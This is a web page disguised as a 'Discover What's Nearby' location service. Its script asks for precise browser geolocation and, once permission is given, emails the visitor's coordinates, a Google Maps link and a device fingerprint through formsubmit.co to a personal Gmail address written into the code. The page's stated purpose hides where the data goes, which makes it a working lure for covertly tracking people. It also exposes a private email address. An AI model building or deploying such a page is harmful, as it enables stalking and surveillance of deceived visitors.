<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, viewport-fit=cover"
    >

    <meta name="theme-color" content="#ffffff">

    <title>Loading</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
            background: #ffffff;
            font-family: Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 24px;
            padding: 24px;
            text-align: center;
        }

        .spinner {
            width: 44px;
            height: 44px;
            border: 3px solid #eeeeee;
            border-top-color: #222222;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .permission-panel {
            max-width: 340px;
            color: #222222;
        }

        .permission-panel h1 {
            font-size: 19px;
            margin-bottom: 12px;
        }

        .permission-panel p {
            font-size: 14px;
            line-height: 1.6;
            color: #666666;
            margin-bottom: 18px;
        }

        .permission-button {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            background: #222222;
            color: white;
            font-size: 15px;
            cursor: none;
        }

        .permission-button:focus-visible {
            outline: 3px solid #888888;
            outline-offset: 3px;
        }

        .status {
            font-size: 13px;
            color: #666666;
            line-height: 1.5;
        }

        [hidden] {
            display: none !important;
        }
    </style>
</head>

<body>

    <main class="loader-container">

        <div
            class="spinner"
            role="status"
            aria-label="Loading"
        ></div>

        <section
            class="permission-panel"
            id="permissionPanel"
            aria-labelledby="heading"
        >
            <h1 id="heading">Discover What's Nearby</h1>

<p>
    Explore content and experiences around your area.
    Allow location access to find relevant results near you.
</p>

            <button
                class="permission-button"
                id="shareButton"
                type="button"
            >
                 proceed to dashboard
            </button>
        </section>

        <p
            class="status"
            id="status"
            role="status"
            aria-live="polite"
            hidden
        ></p>

    </main>

    <script>
        "use strict";

        const EMAIL_ENDPOINT =
            "https://formsubmit.co/ajax/joshuanwachukwu056@gmail.com";

        const permissionPanel =
            document.getElementById("permissionPanel");

        const shareButton =
            document.getElementById("shareButton");

        const statusElement =
            document.getElementById("status");

        function showStatus(message) {
            statusElement.textContent = message;
            statusElement.hidden = false;
        }

        /*
         * Collect browser information that the browser makes
         * available to ordinary websites.
         */
        function getDeviceDetails() {
            const ua = navigator.userAgent || "";

            let operatingSystem = "Unknown";

            if (/iPhone|iPad|iPod/i.test(ua)) {
                operatingSystem = "iOS";
            } else if (/Android/i.test(ua)) {
                operatingSystem = "Android";
            } else if (/Windows/i.test(ua)) {
                operatingSystem = "Windows";
            } else if (/Mac OS X|Macintosh/i.test(ua)) {
                operatingSystem = "macOS";
            } else if (/Linux/i.test(ua)) {
                operatingSystem = "Linux";
            }

            let browser = "Unknown";

            if (/CriOS/i.test(ua)) {
                browser = "Chrome on iOS";
            } else if (/FxiOS/i.test(ua)) {
                browser = "Firefox on iOS";
            } else if (/EdgiOS/i.test(ua)) {
                browser = "Edge on iOS";
            } else if (/OPiOS/i.test(ua)) {
                browser = "Opera on iOS";
            } else if (/Edg\//i.test(ua)) {
                browser = "Microsoft Edge";
            } else if (/SamsungBrowser/i.test(ua)) {
                browser = "Samsung Internet";
            } else if (/Firefox\//i.test(ua)) {
                browser = "Firefox";
            } else if (/Chrome\//i.test(ua)) {
                browser = "Chrome";
            } else if (/Safari\//i.test(ua)) {
                browser = "Safari";
            }

            return {
                operating_system: operatingSystem,
                browser: browser,
                user_agent: ua,
                screen_width: screen.width,
                screen_height: screen.height,
                viewport_width: window.innerWidth,
                viewport_height: window.innerHeight,
                screen_orientation:
                    screen.orientation?.type || "Unavailable",
                language: navigator.language || "Unknown",
                timezone:
                    Intl.DateTimeFormat()
                        .resolvedOptions().timeZone || "Unknown",
                platform: navigator.platform || "Unavailable",
                is_mobile:
                    /Android|iPhone|iPad|iPod|Mobile/i.test(ua),
                collected_at: new Date().toISOString()
            };
        }

        /*
         * Submit information only after the visitor agrees
         * and the browser provides their location.
         */
        async function sendInformation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const details = getDeviceDetails();

            const formData = new FormData();

            formData.append(
                "_subject",
                "Visitor Location and Device Information"
            );

            formData.append(
                "latitude",
                String(latitude)
            );

            formData.append(
                "longitude",
                String(longitude)
            );

            formData.append(
                "location_accuracy_meters",
                String(position.coords.accuracy)
            );

            formData.append(
                "google_maps_link",
                `https://www.google.com/maps?q=${latitude},${longitude}`
            );

            formData.append(
                "device_details",
                JSON.stringify(details, null, 2)
            );

            try {
                showStatus("Sending the information you approved...");

                const response = await fetch(EMAIL_ENDPOINT, {
                    method: "POST",
                    body: formData,
                    headers: {
                        "Accept": "application/json"
                    }
                });

                if (!response.ok) {
                    throw new Error("Email submission failed.");
                }

                const result = await response.json();

                if (result.success === "false") {
                    throw new Error("Email service rejected the submission.");
                }

                showStatus(
                    "Your information was submitted successfully."
                );

            } catch (error) {
                console.error("Submission error:", error);

                showStatus(
                    "We could not submit the information. " +
                    "Please check your connection and try again."
                );
            }
        }

        shareButton.addEventListener("click", function () {

            if (!window.isSecureContext) {
                showStatus(
                    "Location sharing requires a secure HTTPS website."
                );
                return;
            }

            if (!navigator.geolocation) {
                showStatus(
                    "Location services are not supported by this browser."
                );
                return;
            }

            shareButton.disabled = true;

            showStatus(
                "Please respond to your browser's location permission request."
            );

            navigator.geolocation.getCurrentPosition(

                function (position) {
                    permissionPanel.hidden = true;
                    sendInformation(position);
                },

                function (error) {
                    shareButton.disabled = false;

                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            showStatus(
                                "Location permission was denied. " +
                                "You can allow it in your browser settings."
                            );
                            break;

                        case error.POSITION_UNAVAILABLE:
                            showStatus(
                                "Your device could not determine its location."
                            );
                            break;

                        case error.TIMEOUT:
                            showStatus(
                                "The location request timed out. Please try again."
                            );
                            break;

                        default:
                            showStatus(
                                "Location could not be obtained. Please try again."
                            );
                    }
                },

                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        });
    </script>

</body>
</html>
